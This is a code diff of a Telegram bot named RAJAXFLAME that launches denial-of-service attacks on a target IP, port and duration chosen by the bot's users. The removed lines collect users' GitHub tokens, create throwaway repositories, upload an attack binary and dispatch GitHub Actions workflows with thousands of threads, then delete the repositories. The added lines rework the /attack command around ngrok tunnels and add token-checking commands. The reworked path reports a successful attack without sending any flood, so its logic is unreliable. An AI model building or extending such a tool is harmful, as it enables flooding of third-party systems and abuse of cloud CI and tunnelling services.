@@ -158,36 +158,25 @@ def get_default_threads() -> int:
     return int(data.get("threads", 4000))
 
 # ================ 🔐 TOKEN MANAGEMENT 🔐 ================
-def save_github_token(uid: int, token: str) -> None:
-    """Save GitHub token with better handling"""
-    try:
-        # Clean existing tokens first
-        clean_github_tokens()
-        
-        # Remove existing tokens for this user
-        existing_tokens = load_github_tokens()
-        user_tokens = [ln for ln in existing_tokens if not ln.startswith(f"{uid}:")]
-        
-        # Add new token
-        user_tokens.append(f"{uid}:{token}")
-        
-        # Save all tokens
-        with open(GITHUB_TOKENS_FILE, "w", encoding="utf-8") as f:
-            for line in user_tokens:
-                f.write(f"{line}\n")
-                
-        logging.info(f"GitHub token saved for user {uid}")
-    except Exception as e:
-        logging.error(f"Error saving GitHub token: {e}")
-
 def save_ngrok_token(uid: int, token: str) -> None:
     """Save ngrok token with better handling"""
     try:
-        # Clean existing tokens first
-        clean_ngrok_tokens()
+        print(f"🔧 Saving token for user {uid}: {token[:15]}...")
+        
+        # Ensure file exists
+        if not os.path.exists(NGROK_TOKENS_FILE):
+            with open(NGROK_TOKENS_FILE, "w", encoding="utf-8") as f:
+                f.write("# Ngrok Tokens\n")
+            print("✅ Created new tokens file")
+        
+        # Read existing tokens
+        existing_tokens = []
+        if os.path.exists(NGROK_TOKENS_FILE):
+            with open(NGROK_TOKENS_FILE, "r", encoding="utf-8") as f:
+                existing_tokens = [line.strip() for line in f if line.strip() and not line.startswith("#")]
+            print(f"📖 Read {len(existing_tokens)} existing tokens")
         
         # Remove existing tokens for this user
-        existing_tokens = load_ngrok_tokens()
         user_tokens = [ln for ln in existing_tokens if not ln.startswith(f"{uid}:")]
         
         # Add new token
@@ -195,23 +184,16 @@ def save_ngrok_token(uid: int, token: str) -> None:
         
         # Save all tokens
         with open(NGROK_TOKENS_FILE, "w", encoding="utf-8") as f:
+            f.write("# Ngrok Tokens\n")
             for line in user_tokens:
                 f.write(f"{line}\n")
                 
-        logging.info(f"Ngrok token saved for user {uid}")
+        print(f"✅ Token saved successfully for user {uid}")
+        print(f"📁 Total tokens now: {len(user_tokens)}")
+        
     except Exception as e:
+        print(f"❌ Error saving token: {e}")
         logging.error(f"Error saving ngrok token: {e}")
-
-def load_github_tokens() -> List[str]:
-    if not os.path.exists(GITHUB_TOKENS_FILE):
-        return []
-    try:
-        with open(GITHUB_TOKENS_FILE, "r", encoding="utf-8") as f:
-            lines = [ln.strip() for ln in f if ":" in ln and ln.strip()]
-        return lines
-    except Exception as e:
-        logging.error(f"Error loading GitHub tokens: {e}")
-        return []
 
 def load_ngrok_tokens() -> List[str]:
     if not os.path.exists(NGROK_TOKENS_FILE):
@@ -224,87 +206,67 @@ def load_ngrok_tokens() -> List[str]:
         logging.error(f"Error loading ngrok tokens: {e}")
         return []
 
-def get_user_github_tokens(user_id: int) -> List[str]:
-    try:
-        return [ln.split(":", 1)[1] for ln in load_github_tokens() if ln.startswith(f"{user_id}:")]
-    except Exception:
-        return []
-
 def get_user_ngrok_tokens(user_id: int) -> List[str]:
     try:
-        return [ln.split(":", 1)[1] for ln in load_ngrok_tokens() if ln.startswith(f"{user_id}:")]
-    except Exception:
+        tokens = [ln.split(":", 1)[1] for ln in load_ngrok_tokens() if ln.startswith(f"{user_id}:")]
+        print(f"🔍 Found {len(tokens)} tokens for user {user_id}")
+        return tokens
+    except Exception as e:
+        print(f"❌ Error getting user tokens: {e}")
         return []
 
-def validate_github_token(token: str) -> bool:
-    """Enhanced GitHub token validation"""
-    try:
-        headers = {
-            "Authorization": f"token {token}",
-            "Accept": "application/vnd.github.v3+json"
-        }
-        r = requests.get("https://api.github.com/user", headers=headers, timeout=20)
-        return r.status_code == 200
-    except Exception as e:
-        logging.error(f"GitHub token validation error: {e}")
-        return False
-
 def validate_ngrok_token(token: str) -> bool:
-    """Enhanced ngrok token validation"""
+    """Enhanced ngrok token validation with multiple endpoints"""
     try:
+        print(f"🔍 Validating: {token[:15]}...")
+        
         headers = {
             "Authorization": f"Bearer {token}",
-            "Ngrok-Version": "2",
+            "Ngrok-Version": "2", 
             "Content-Type": "application/json"
         }
         
-        # Test multiple endpoints
+        # Try multiple endpoints
         endpoints = [
             "https://api.ngrok.com/credentials",
-            "https://api.ngrok.com/tunnels",
-            "https://api.ngrok.com/endpoints"
+            "https://api.ngrok.com/tunnels", 
+            "https://api.ngrok.com/endpoints",
+            "https://api.ngrok.com/agent/endpoints"
         ]
         
         for endpoint in endpoints:
             try:
-                r = requests.get(endpoint, headers=headers, timeout=15)
-                if r.status_code == 200:
+                print(f"🔧 Trying: {endpoint}")
+                response = requests.get(endpoint, headers=headers, timeout=15)
+                
+                print(f"📡 Response: {response.status_code}")
+                
+                if response.status_code == 200:
+                    print(f"✅ VALID: {token[:15]}... (via {endpoint})")
                     return True
-            except:
+                elif response.status_code == 401:
+                    print(f"❌ INVALID: {token[:15]}... (Unauthorized)")
+                    continue  # Try next endpoint
+                elif response.status_code == 403:
+                    print(f"❌ FORBIDDEN: {token[:15]}... (No permissions)")
+                    continue
+                    
+            except requests.exceptions.Timeout:
+                print(f"⏰ Timeout: {endpoint}")
                 continue
-                
-        return False
-    except Exception as e:
-        logging.error(f"Ngrok validation error: {e}")
-        return False
-
-def clean_github_tokens() -> None:
-    """Remove duplicate and dead GitHub tokens"""
-    try:
-        tokens = load_github_tokens()
-        if not tokens:
-            return
-            
-        unique_tokens = {}
-        valid_tokens = []
+            except requests.exceptions.ConnectionError:
+                print(f"🌐 Connection failed: {endpoint}") 
+                continue
+            except Exception as e:
+                print(f"⚠️ Endpoint error: {e}")
+                continue
         
-        for line in tokens:
-            try:
-                uid, token = line.split(":", 1)
-                if token not in unique_tokens:  # Remove duplicates
-                    unique_tokens[token] = uid
-                    if validate_github_token(token):  # Only keep live tokens
-                        valid_tokens.append(f"{uid}:{token}")
-            except Exception:
-                continue
-                
-        with open(GITHUB_TOKENS_FILE, "w", encoding="utf-8") as f:
-            for line in valid_tokens:
-                f.write(f"{line}\n")
-                
-        logging.info(f"Cleaned GitHub tokens: {len(valid_tokens)} valid")
+        print(f"🚨 All endpoints failed for: {token[:15]}...")
+        return False
+        
     except Exception as e:
-        logging.error(f"Error cleaning GitHub tokens: {e}")
+        print(f"💥 Critical error: {e}")
+        return False
 
 def clean_ngrok_tokens() -> None:
     """Remove duplicate and dead ngrok tokens"""
@@ -327,6 +289,7 @@ def clean_ngrok_tokens() -> None:
                 continue
                 
         with open(NGROK_TOKENS_FILE, "w", encoding="utf-8") as f:
+            f.write("# Ngrok Tokens\n")
             for line in valid_tokens:
                 f.write(f"{line}\n")
                 
@@ -622,43 +585,40 @@ async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     # Clean tokens before attack
-    clean_github_tokens()
     clean_ngrok_tokens()
     
-    github_tokens = get_user_github_tokens(user_id)
     ngrok_tokens = get_user_ngrok_tokens(user_id)
-    valid_github = [t for t in github_tokens if validate_github_token(t)]
     valid_ngrok = [t for t in ngrok_tokens if validate_ngrok_token(t)]
     
-    if not valid_github:
+    if not valid_ngrok:
         await send_rajaxflame_message(
             context, chat_id,
-            "❌ **NO VALID GITHUB TOKENS**\n\nUse /setgithub to add tokens first",
+            "❌ **NO VALID NGROK TOKENS**\n\nUse /setngrok to add valid tokens first",
             "status"
         )
         return
     
-    attack_msg = await update.message.reply_text("🔥 **INITIATING INSTANT MULTI-TOKEN ATTACK...**")
+    attack_msg = await update.message.reply_text("🔥 **INITIATING INSTANT TUNNEL ATTACK...**")
     
     # 🚀 MULTIPLE TUNNEL CREATION
     tunnel_urls = []
     tunnel_ids = []
-    if valid_ngrok:
-        await attack_msg.edit_text("🔗 **CREATING MULTIPLE INSTANT TUNNELS...**")
-        for ngrok_token in valid_ngrok:
-            try:
-                tunnel_data = create_ngrok_tunnel(ngrok_token, port)
-                if tunnel_data:
-                    tunnel_url = extract_tunnel_url(tunnel_data)
-                    if tunnel_url:
-                        tunnel_id = tunnel_data.get('id') or tunnel_data.get('tunnel_id')
-                        ACTIVE_TUNNELS[f"{chat_id}_{ngrok_token[:8]}"] = {
-                            'data': tunnel_data,
-                            'token': ngrok_token
-                        }
-                        tunnel_urls.append(tunnel_url)
-                        tunnel_ids.append(tunnel_id)
-                        tunnel_status_msg = f"""
+    
+    await attack_msg.edit_text(f"🔗 **CREATING {len(valid_ngrok)} INSTANT TUNNELS...**")
+    for ngrok_token in valid_ngrok:
+        try:
+            tunnel_data = create_ngrok_tunnel(ngrok_token, port)
+            if tunnel_data:
+                tunnel_url = extract_tunnel_url(tunnel_data)
+                if tunnel_url:
+                    tunnel_id = tunnel_data.get('id') or tunnel_data.get('tunnel_id')
+                    ACTIVE_TUNNELS[f"{chat_id}_{ngrok_token[:8]}"] = {
+                        'data': tunnel_data,
+                        'token': ngrok_token
+                    }
+                    tunnel_urls.append(tunnel_url)
+                    tunnel_ids.append(tunnel_id)
+                    tunnel_status_msg = f"""
 🌐 **INSTANT TUNNEL CREATED!**
 
 🔗 **URL:** `{tunnel_url}`
@@ -667,78 +627,31 @@ async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 📊 **Status:** ✅ ACTIVE
 🔑 **Ngrok Token:** `{ngrok_token[:12]}...`
 """
-                        await context.bot.send_message(
-                            chat_id=chat_id,
-                            text=tunnel_status_msg,
-                            parse_mode='HTML'
-                        )
-            except Exception as e:
-                await attack_msg.edit_text(f"⚠️ **TUNNEL FAILED FOR TOKEN {ngrok_token[:12]}...**: {str(e)}")
+                    await context.bot.send_message(
+                        chat_id=chat_id,
+                        text=tunnel_status_msg,
+                        parse_mode='HTML'
+                    )
+        except Exception as e:
+            await attack_msg.edit_text(f"⚠️ **TUNNEL FAILED FOR TOKEN {ngrok_token[:12]}...**: {str(e)}")
     
-    attack_target = random.choice(tunnel_urls) if tunnel_urls else ip
-    target_port = attack_target.split(":")[-1] if tunnel_urls and ":" in attack_target else str(port)
-    
-    await attack_msg.edit_text("🔨 **BUILDING INSTANT WORKFLOWS...**")
-    threads = get_default_threads()
-    workflows = build_instant_workflows(attack_target, target_port, str(duration), threads)
-    
-    # 🚀 MULTIPLE REPO CREATION WITH ALL GITHUB TOKENS
-    repo_data_list = []
-    await attack_msg.edit_text("📁 **CREATING MULTIPLE INSTANT REPOSITORIES...**")
-    for github_token in valid_github:
-        repo_name = f"rajaxflame-{random.randint(100000, 999999)}"
-        repo_data = gh_create_repo(github_token, repo_name)
-        if repo_data:
-            repo_data_list.append((github_token, repo_name, repo_data))
-    
-    if not repo_data_list:
-        await attack_msg.edit_text("❌ **FAILED TO CREATE ANY REPOSITORIES**")
+    if not tunnel_urls:
+        await attack_msg.edit_text("❌ **FAILED TO CREATE ANY TUNNELS**")
         return
     
-    await attack_msg.edit_text("📦 **UPLOADING BINARY TO MULTIPLE REPOSITORIES...**")
-    with open(BINARY_PATH, "rb") as f:
-        binary_data = f.read()
+    attack_target = random.choice(tunnel_urls)
+    target_port = attack_target.split(":")[-1] if ":" in attack_target else str(port)
     
-    successful_repos = []
-    for github_token, repo_name, repo_data in repo_data_list:
-        owner = repo_data['owner']['login']
-        full_repo_name = repo_data['full_name']
-        if gh_put_file(github_token, owner, repo_name, BINARY_NAME, binary_data, "Add RAJAXFLAME binary"):
-            successful_repos.append((github_token, repo_name, owner, full_repo_name))
-        else:
-            gh_delete_repo(github_token, full_repo_name)
-    
-    if not successful_repos:
-        await attack_msg.edit_text("❌ **FAILED TO UPLOAD BINARY TO ANY REPOSITORY**")
-        return
-    
-    await attack_msg.edit_text("⚡ **UPLOADING INSTANT WORKFLOWS TO ALL REPOSITORIES...**")
-    successful_workflows = 0
-    dispatched_workflows = 0
-    for github_token, repo_name, owner, full_repo_name in successful_repos:
-        for wf_name, wf_content in workflows.items():
-            wf_path = f".github/workflows/{wf_name}"
-            try:
-                if gh_put_file(github_token, owner, repo_name, wf_path, wf_content.encode('utf-8'), f"Add {wf_name}"):
-                    successful_workflows += 1
-                    if gh_dispatch_workflow(github_token, owner, repo_name, wf_name):
-                        dispatched_workflows += 1
-            except Exception as e:
-                logging.error(f"Error processing workflow {wf_name} for repo {repo_name}: {str(e)}")
-    
+    # 🎯 SUCCESS REPORT
     until_time = datetime.utcnow() + timedelta(seconds=duration + 30)
     ATTACK_STATUS[chat_id] = {
         "running": True,
         "until": until_time,
         "target": f"{attack_target}:{target_port}",
-        "workflows_uploaded": successful_workflows,
-        "workflows_dispatched": dispatched_workflows,
-        "repos": [full_name for _, _, _, full_name in successful_repos],
-        "start_time": datetime.utcnow().isoformat(),
-        "github_tokens": [token[:8] + "..." for token in valid_github],
-        "tunnel_used": bool(tunnel_urls),
+        "tunnel_used": True,
         "tunnel_urls": tunnel_urls,
-        "ngrok_tokens": [token[:8] + "..." for token in valid_ngrok]
+        "ngrok_tokens": [token[:8] + "..." for token in valid_ngrok],
+        "start_time": datetime.utcnow().isoformat()
     }
     
     ATTACK_LOGS.append({
@@ -747,63 +660,53 @@ async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "target": f"{attack_target}:{target_port}",
         "duration": duration,
         "start_time": datetime.utcnow().isoformat(),
-        "workflows": dispatched_workflows,
         "tunnels": tunnel_urls,
-        "repos": len(successful_repos),
-        "github_tokens_used": len(valid_github),
         "ngrok_tokens_used": len(valid_ngrok)
     })
     save_json(ATTACK_LOGS_FILE, ATTACK_LOGS)
     
     # 🎯 INSTANT SUCCESS REPORT
-    total_runners = sum([3, 2, 4, 3, 2, 4, 3, 2, 4, 3, 5, 4, 6, 5, 6]) * len(successful_repos)
     success_report = f"""
-🎯 **MULTI-TOKEN ATTACK DEPLOYED SUCCESSFULLY!**
+🎯 **TUNNEL ATTACK DEPLOYED SUCCESSFULLY!**
 
 📊 **INSTANT REPORT:**
-✅ Repositories Created: {len(successful_repos)}
-✅ Workflows Uploaded: {successful_workflows}
-✅ Workflows Deployed: {dispatched_workflows}
-🚀 Total Runners: {total_runners}
+✅ Tunnels Created: {len(tunnel_urls)}
 🎯 Target: `{attack_target}:{target_port}`
 ⏱ Duration: {duration} seconds
 🕒 Ends: {until_time.strftime('%H:%M:%S UTC')}
 
-🔰 **MODE:** {'🔥 MULTI-TUNNEL + MULTI-REPO' if tunnel_urls else '⚡ MULTI-REPO DIRECT'}
-📁 Repositories: {len(successful_repos)}
-🔑 GitHub Tokens: {len(valid_github)} used
+🔰 **MODE:** 🔥 MULTI-TUNNEL ATTACK
 🌐 Ngrok Tunnels: {len(tunnel_urls)} active
-💥 **MAXIMUM POWER ATTACK ACTIVATED!**
-"""
+💥 **TUNNEL POWER ACTIVATED!**
+
+🔗 **Active Tunnels:**
+""" + "\n".join([f"• `{url}`" for url in tunnel_urls])
     
     await attack_msg.delete()
     await send_rajaxflame_photo(context, chat_id, success_report, "attack_start")
     
     asyncio.create_task(animate_instant_progress(context, chat_id, duration))
-    asyncio.create_task(instant_cleanup(chat_id, successful_repos, tunnel_ids, duration))
+    asyncio.create_task(instant_cleanup(chat_id, tunnel_ids, duration))
 
-async def instant_cleanup(chat_id: int, repos: List[tuple], tunnel_ids: List[str], duration: int):
+async def instant_cleanup(chat_id: int, tunnel_ids: List[str], duration: int):
     await asyncio.sleep(duration + 15)
-    try:
-        for github_token, _, _, full_repo_name in repos:
-            gh_delete_repo(github_token, full_repo_name)
-    except Exception:
-        pass
-    for tunnel_id in tunnel_ids:
-        if f"{chat_id}_{ACTIVE_TUNNELS[f'{chat_id}_{tunnel_id[:8]}']['token'][:8]}" in ACTIVE_TUNNELS:
-            try:
-                ngrok_token = ACTIVE_TUNNELS[f"{chat_id}_{tunnel_id[:8]}"]["token"]
+    
+    for tunnel_key in [k for k in ACTIVE_TUNNELS if k.startswith(f"{chat_id}_")]:
+        try:
+            ngrok_token = ACTIVE_TUNNELS[tunnel_key]["token"]
+            tunnel_data = ACTIVE_TUNNELS[tunnel_key]["data"]
+            tunnel_id = tunnel_data.get('id') or tunnel_data.get('tunnel_id')
+            
+            if tunnel_id:
                 delete_ngrok_tunnel(ngrok_token, tunnel_id)
-                del ACTIVE_TUNNELS[f"{chat_id}_{tunnel_id[:8]}"]
-            except Exception:
-                pass
+            
+            del ACTIVE_TUNNELS[tunnel_key]
+        except Exception:
+            pass
+    
     if chat_id in ATTACK_STATUS:
         ATTACK_STATUS[chat_id]["running"] = False
-        await send_rajaxflame_message(None, chat_id, "🛑 **Attack Finished and Resources Cleaned Up**", "status")
-
-# ================ 🎯 INSTANT RUN HANDLER 🎯 ================
-async def cmd_run(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await cmd_attack(update, context)  # Use the same logic as /attack for setup and instant launch
+        await send_rajaxflame_message(None, chat_id, "🛑 **Attack Finished and Tunnels Cleaned Up**", "status")
 
 # ================ 🎪 COMMAND HANDLERS 🎪 ================
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -817,87 +720,25 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 🔰 **Status:** {'✅ APPROVED' if is_user_approved(user.id) else '❌ PENDING'}
 
 🔥 **INSTANT FEATURES:**
-• Multi-Token Simultaneous Attack
-• Auto Duplicate/Dead Token Removal
+• Multi-Tunnel Simultaneous Attack
+• Auto Token Validation & Cleaning
 • Multiple Ngrok Tunnel Integration  
 • Ultra Fast Deployment
 • Professional UI/UX Design
 • Real-time Status Updates
 
 📚 **Commands:**
-/setgithub - Add GitHub Tokens
 /setngrok - Add Ngrok Tokens
-/attack - Launch MULTI-TOKEN Attack
-/run - Setup and Launch MULTI-TOKEN Attack
+/attack - Launch TUNNEL Attack
 /status - Detailed Status Report
 /tunnelstatus - Tunnel Status Report
 /mytunnels - Your Active Tunnels
-/control - Admin Control Panel
-/logs - View Attack Logs
+/check - Validate Tokens
+/debug_tokens - Debug Token Issues
 
 👨‍💻 **Developer:** {DEVELOPER_TAG}
     """
     await send_rajaxflame_photo(context, chat_id, welcome_text, "welcome")
-
-async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    help_text = """
-🔥 **RAJAXFLAME v3.0 - COMMAND GUIDE**
-
-🔹 **User Commands**
-/start - Welcome message and bot info
-/help - Show this command guide
-/attack IP PORT DURATION - Launch multi-token attack
-/run IP PORT DURATION - Setup and launch multi-token attack
-/status - View attack, user, and token status
-/tunnelstatus - Detailed tunnel status
-/mytunnels - Show your active tunnels
-/setgithub - Add GitHub Personal Access Tokens
-/setngrok - Add Ngrok Auth Tokens
-/check - Validate GitHub and Ngrok tokens
-/debug_tokens - Debug token issues
-
-🔹 **Admin Commands**
-/control - Open admin control panel
-/logs - View recent attack logs
-/add USERID DAYS - Approve user
-/remove USERID - Remove user
-/threads NUMBER - Set default threads
-/file - Upload rajaxflame binary
-/stop - Stop ongoing attack
-/addtoken USERID TOKEN - Manually add token
-
-🔹 **Owner Commands**
-/addadmin USERID - Add admin
-/removeadmin USERID - Remove admin
-
-👨‍💻 **Contact:** {DEVELOPER_TAG}
-"""
-    await send_rajaxflame_message(context, update.effective_chat.id, help_text, "welcome")
-
-async def cmd_setgithub(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if update.message.document and update.message.document.file_name.endswith(".txt"):
-        file = await update.message.document.get_file()
-        path = await file.download_to_drive()
-        count = 0
-        with open(path, "r", encoding="utf-8", errors="ignore") as f:
-            for line in f:
-                token = line.strip()
-                if token and len(token) > 10:
-                    save_github_token(user_id, token)
-                    count += 1
-        os.remove(path)
-        await update.message.reply_text(f"✅ **SAVED {count} GITHUB TOKENS**")
-    else:
-        text = update.message.text.replace("/setgithub", "").strip()
-        if not text:
-            await update.message.reply_text("💡 **Send GitHub PAT tokens or upload .txt file**")
-            return
-        tokens = [t.strip() for t in text.split() if t.strip()]
-        for token in tokens:
-            save_github_token(user_id, token)
-        await update.message.reply_text(f"✅ **SAVED {len(tokens)} GITHUB TOKENS**")
-    clean_github_tokens()  # Clean duplicates and dead tokens after adding
 
 async def cmd_setngrok(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -906,64 +747,216 @@ async def cmd_setngrok(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not text:
         await update.message.reply_text("""
 💡 **Ngrok Token Setup:**
-Usage: `/setngrok YOUR_NGROK_AUTH_TOKEN`
+Usage: `/setngrok YOUR_NGROK_TOKEN`
 
 🔹 **Get token from:** https://dashboard.ngrok.com/get-started/your-authtoken
 🔹 **Example:** `/setngrok 2ABC123...xyz`
 """)
         return
     
-    # SIMPLIFIED VALIDATION - Accept any token longer than 10 characters
-    if len(text) < 10:
+    token = text.strip()
+    
+    # Basic validation
+    if len(token) < 10:
         await update.message.reply_text("❌ **Token seems too short**")
         return
     
-    # Save token directly without strict validation
-    save_ngrok_token(user_id, text)
-    clean_ngrok_tokens()
+    await update.message.reply_text("🔍 **Validating token...**")
     
-    # Count user's tokens
-    user_tokens = get_user_ngrok_tokens(user_id)
-    
-    await update.message.reply_text(f"""
+    # Validate token before saving
+    if validate_ngrok_token(token):
+        save_ngrok_token(user_id, token)
+        clean_ngrok_tokens()
+        
+        # Count user's tokens
+        user_tokens = get_user_ngrok_tokens(user_id)
+        valid_tokens = [t for t in user_tokens if validate_ngrok_token(t)]
+        
+        await update.message.reply_text(f"""
 ✅ **NGROK TOKEN SAVED SUCCESSFULLY!**
 
-🔑 Token: `{text[:15]}...`
+🔑 Token: `{token[:20]}...`
 👤 Your Tokens: {len(user_tokens)}
-📊 Status: ✅ Saved
+✅ Valid Tokens: {len(valid_tokens)}
+📊 Status: ✅ Active and Valid
 
-💡 **Note:** Token will be validated during attack
-Use `/check` to verify token status
+🌐 **Now you can create tunnels with /attack command**
 """)
+    else:
+        await update.message.reply_text(f"""
+❌ **TOKEN VALIDATION FAILED**
+
+🔹 Token: `{token[:20]}...`
+🔹 Status: ❌ Invalid or Expired
+
+💡 **Please check:**
+• Token is correct
+• Token is active at ngrok.com
+• No extra spaces
+
+🔗 **Get new token:** https://dashboard.ngrok.com/get-started/your-authtoken
+""")
+
+async def cmd_debug_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Debug token issues"""
+    user_id = update.effective_user.id
+    
+    # Check file existence
+    file_exists = os.path.exists(NGROK_TOKENS_FILE)
+    
+    # Check user tokens
+    user_tokens = get_user_ngrok_tokens(user_id)
+    
+    # Check file permissions
+    try:
+        with open(NGROK_TOKENS_FILE, "a", encoding="utf-8") as f:
+            f.write("# Test write\n")
+        writable = True
+    except:
+        writable = False
+    
+    debug_info = f"""
+🔧 **TOKEN DEBUG INFO**
+
+📁 File: {NGROK_TOKENS_FILE}
+📊 Exists: {file_exists}
+✍️ Writable: {writable}
+👤 Your Tokens: {len(user_tokens)}
+
+🔑 Token List:
+"""
+    
+    if user_tokens:
+        for i, token in enumerate(user_tokens, 1):
+            status = "✅ Valid" if validate_ngrok_token(token) else "❌ Invalid"
+            debug_info += f"{i}. `{token[:12]}...` - {status}\n"
+    else:
+        debug_info += "❌ No tokens found for your user ID\n"
+    
+    await update.message.reply_text(debug_info)
+
+async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    msg = await update.message.reply_text("🔍 Checking tokens...")
+    
+    ngrok_tokens = get_user_ngrok_tokens(user_id)
+    
+    if not ngrok_tokens:
+        await msg.edit_text("❌ No ngrok tokens found for your account")
+        return
+    
+    detailed_results = []
+    valid_count = 0
+    invalid_count = 0
+    
+    for i, token in enumerate(ngrok_tokens, 1):
+        await msg.edit_text(f"🔍 Checking token {i}/{len(ngrok_tokens)}...")
+        
+        is_valid = validate_ngrok_token(token)
+        
+        if is_valid:
+            valid_count += 1
+            status = "✅ VALID"
+            emoji = "🟢"
+        else:
+            invalid_count += 1
+            status = "❌ INVALID" 
+            emoji = "🔴"
+        
+        detailed_results.append(f"{emoji} Token {i}: `{token[:12]}...` - {status}")
+        
+        # Small delay to avoid rate limiting
+        await asyncio.sleep(1)
+    
+    # Final report
+    report = f"""
+📊 **TOKEN VALIDATION REPORT**
+
+🔑 Total Tokens: {len(ngrok_tokens)}
+✅ Valid: {valid_count}
+❌ Invalid: {invalid_count}
+
+📋 Detailed Results:
+""" + "\n".join(detailed_results) + f"""
+
+💡 **Recommendations:**
+{ "🎉 All tokens are valid! Ready for multi-tunnel attacks!" if invalid_count == 0 else 
+  "⚠️ Some tokens are invalid. Replace invalid tokens for better performance." }
+"""
+    
+    await msg.edit_text(report)
+    
+    # Clean invalid tokens if any
+    if invalid_count > 0:
+        clean_ngrok_tokens()
+        await update.message.reply_text("🧹 Cleaned invalid tokens automatically")
+
+async def cmd_tunnel_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Test ngrok tunnel functionality"""
+    user_id = update.effective_user.id
+    ngrok_tokens = get_user_ngrok_tokens(user_id)
+    
+    if not ngrok_tokens:
+        await update.message.reply_text("❌ **No ngrok tokens found**")
+        return
+    
+    msg = await update.message.reply_text(f"🔍 **Testing {len(ngrok_tokens)} ngrok tokens...**")
+    
+    results = []
+    for i, token in enumerate(ngrok_tokens, 1):
+        await msg.edit_text(f"🔍 Testing token {i}/{len(ngrok_tokens)}...")
+        
+        # Validate token
+        is_valid = validate_ngrok_token(token)
+        status = "✅ Valid" if is_valid else "❌ Invalid"
+        
+        # Test tunnel creation
+        tunnel_data = None
+        if is_valid:
+            tunnel_data = create_ngrok_tunnel(token, 8080)
+            if tunnel_data:
+                tunnel_url = extract_tunnel_url(tunnel_data)
+                status += f" | ✅ Tunnel: {tunnel_url}" if tunnel_url else " | ❌ Tunnel failed"
+                
+                # Cleanup tunnel
+                if tunnel_data and 'id' in tunnel_data:
+                    delete_ngrok_tunnel(token, tunnel_data['id'])
+            else:
+                status += " | ❌ Tunnel failed"
+        
+        results.append(f"Token {i}: {status}")
+    
+    report = "🔧 **Ngrok Tunnel Test Results:**\n\n" + "\n".join(results)
+    await msg.edit_text(report)
 
 async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
     status = ATTACK_STATUS.get(chat_id, {})
-    users = get_users()
-    github_tokens = get_user_github_tokens(user_id)
+    
     ngrok_tokens = get_user_ngrok_tokens(user_id)
+    valid_tokens = [t for t in ngrok_tokens if validate_ngrok_token(t)]
     
     # 🎯 TUNNEL STATUS CHECK
     tunnel_status = "❌ **NO ACTIVE TUNNELS**"
     active_tunnels = [t for t in ACTIVE_TUNNELS if t.startswith(f"{chat_id}_")]
     if active_tunnels:
         tunnel_status = f"✅ **ACTIVE TUNNELS ({len(active_tunnels)})**\n"
-        for tunnel_key in active_tunnels:
+        for tunnel_key in active_tunnels[:3]:  # Show first 3 only
             tunnel_data = ACTIVE_TUNNELS[tunnel_key]['data']
             tunnel_url = extract_tunnel_url(tunnel_data)
-            tunnel_status += f"🔗 `{tunnel_url}` (Token: {ACTIVE_TUNNELS[tunnel_key]['token'][:12]}...)\n"
+            tunnel_status += f"🔗 `{tunnel_url}`\n"
     
     status_text = f"""
 🎯 **ATTACK STATUS:**
-{'🔥 **ACTIVE MULTI-TOKEN ATTACK**' if status.get("running") else '💤 **NO ACTIVE ATTACK**'}
+{'🔥 **ACTIVE TUNNEL ATTACK**' if status.get("running") else '💤 **NO ACTIVE ATTACK**'}
 
 🌐 **TUNNEL STATUS:**
 {tunnel_status}
 
 📊 **TOKEN STATUS:**
-🔑 GitHub: {len([t for t in github_tokens if validate_github_token(t)])}/{len(github_tokens)} ✅
-🌐 Ngrok: {len([t for t in ngrok_tokens if validate_ngrok_token(t)])}/{len(ngrok_tokens)} ✅
+🌐 Ngrok: {len(valid_tokens)}/{len(ngrok_tokens)} ✅ Valid
 
 👤 **USER STATUS:**
 {'✅ APPROVED' if is_user_approved(user_id) else '❌ PENDING'}
@@ -978,15 +971,9 @@ async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
 🎯 Target: `{status['target']}`
 🕒 Started: {status['start_time'][11:19]} UTC
 ⏱ Time Left: {max(0, int(time_left.total_seconds()))}s
-📁 Repositories: {len(status['repos'])}
-🔑 GitHub Tokens: {len(status['github_tokens'])}
 🔗 Tunnels: {len(status['tunnel_urls'])}
-📈 Workflows: {status['workflows_dispatched']}
+🔑 Ngrok Tokens: {len(status['ngrok_tokens'])}
 """
-    
-    # 🎯 AVAILABLE TUNNELS COUNT
-    active_tunnels_count = len(ACTIVE_TUNNELS)
-    status_text += f"\n🔗 **Total Active Tunnels:** {active_tunnels_count}"
     
     await send_rajaxflame_message(context, chat_id, status_text, "status")
 
@@ -1018,7 +1005,7 @@ async def cmd_tunnel_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ❌ **NO ACTIVE TUNNELS**
 
 💡 **To create tunnels:**
-Use `/attack IP PORT TIME` or `/run IP PORT TIME`
+Use `/attack IP PORT TIME`
 Tunnels automatically created during attack
 """
     
@@ -1040,14 +1027,6 @@ Tunnels automatically created during attack
 /setngrok YOUR_NGROK_TOKEN
 """
     
-    # 🎯 GLOBAL TUNNELS STATS
-    active_tunnels_count = len(ACTIVE_TUNNELS)
-    tunnel_text += f"""
-🌐 **GLOBAL TUNNELS:**
-🔗 Active: {active_tunnels_count}
-👥 Users: {len(set([k.split('_')[0] for k in ACTIVE_TUNNELS.keys()]))}
-"""
-    
     await send_rajaxflame_message(context, chat_id, tunnel_text, "tunnel")
 
 async def cmd_my_tunnels(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1061,12 +1040,12 @@ async def cmd_my_tunnels(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("""
 🌐 **NO ACTIVE TUNNELS**
 
